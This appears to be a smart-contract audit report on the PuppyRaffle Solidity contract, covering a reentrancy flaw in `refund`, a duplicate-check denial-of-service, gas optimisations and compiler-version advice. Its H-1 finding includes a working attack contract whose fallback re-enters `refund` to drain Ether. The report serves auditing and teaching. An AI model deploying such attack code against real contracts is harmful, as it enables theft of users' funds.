## [H-1]

**Description:**  The `PuppyRaffle::refund` function does not follow CEI (checks, 
effects, interactions) and as a result allows participants to drain all the funds.
In the `PuppyRaffle::refund` function we first make an external call to the `msg.sender`
address and only after that we update the state of the `PuppyRaffle::players` array.

```javascript
   function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
@>        payable(msg.sender).sendValue(entranceFee);
@>        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
 ```

## Impact

If exploited, this vulnerability could allow a malicious contract to drain Ether from the PuppyRaffle contract, leading to loss of funds for the contract and its users.
```javascript
PuppyRaffle.players (src/PuppyRaffle.sol#23) can be used in cross function reentrancies:
- PuppyRaffle.enterRaffle(address[]) (src/PuppyRaffle.sol#79-92)
- PuppyRaffle.getActivePlayerIndex(address) (src/PuppyRaffle.sol#110-117)
- PuppyRaffle.players (src/PuppyRaffle.sol#23)
- PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#96-105)
- PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#125-154)
```
## POC

1. User enters the raffle
2. Attacker sets up a contract with a fallback function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.



<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./PuppyRaffle.sol";

contract AttackContract {
    PuppyRaffle public puppyRaffle;
    uint256 public receivedEther;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attack() public payable {
        require(msg.value > 0);

        // Create a dynamic array and push the sender's address
        address[] memory players = new address[](1);
        players[0] = address(this);

        puppyRaffle.enterRaffle{value: msg.value}(players);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= msg.value) {
            receivedEther += msg.value;

            // Find the index of the sender's address
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));

            if (playerIndex > 0) {
                // Refund the sender if they are in the raffle
                puppyRaffle.refund(playerIndex);
            }
        }
    }
}
```
we create a malicious contract (AttackContract) that enters the raffle and then uses its fallback function to repeatedly call refund before the PuppyRaffle contract has a chance to update its state.
</details>


## Tools Used
Manual Review

## Recommendations
To mitigate the reentrancy vulnerability, you should follow the Checks-Effects-Interactions pattern. This pattern suggests that you should make any state changes before calling external contracts or sending Ether.

Here's how you can modify the refund function:

```javascript
function refund(uint256 playerIndex) public {
address playerAddress = players[playerIndex];
require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

// Update the state before sending Ether
players[playerIndex] = address(0);
emit RaffleRefunded(playerAddress);

// Now it's safe to send Ether
(bool success, ) = payable(msg.sender).call{value: entranceFee}("");
require(success, "PuppyRaffle: Failed to refund");


}
```

This way, even if the msg.sender is a malicious contract that tries to re-enter the refund function, it will fail the require check because the player's address has already been set to address(0).Also we changed the event is emitted before the external call, and the external call is the last step in the function. This mitigates the risk of a reentrancy attack.



## [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS), incrementing gas costs for future entrants

**description** The `PuppyRaffle::enterRaffle` loops through the `players` array to check for duplicates, however the longer the array, the costlier the function execution.

  ```javascript
  for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

  ```

**impact** The gas costs for raffle entrants will greatly increase as more player enter the raffle, dicouraging later users from entering, and causing a rush at the start of a raffle.

**Prooof of Concept**

If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players:  ~ 6252048gas
- 2nd 100 players: ~ 18068138gas
  

# Gas

## [G-1] Unchanged state variables should be declared constant or immutable
Reading from storage is much more expensive than reading constants or immutable 
variables.
instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

## [G-2] When using `players.length` in a loop, we're reading from storage every time.
This can be very gas expensive if the array is big.
In this case you better cache this:

```diff
  function getActivePlayerIndex(address player) external view returns (uint256) {
+   uint256 playerLength = players.length; // read from storage once
-        for (uint256 i = 0; i < players.length; i++) {
+        for (uint256 i = 0; i < playerLength; i++) {
            if (players[i] == player) {
                return i;
            }
 ```

## [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

## [I-2]: Using an outdated version of Solidity is not recommended

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**
Deploy with any of the following Solidity versions:

`0.8.18`
The recommendations take into account:

Risks related to recent releases
Risks of complex code generation changes
Risks of new language features
Risks of known bugs
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

please see Slither: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity    for more information.

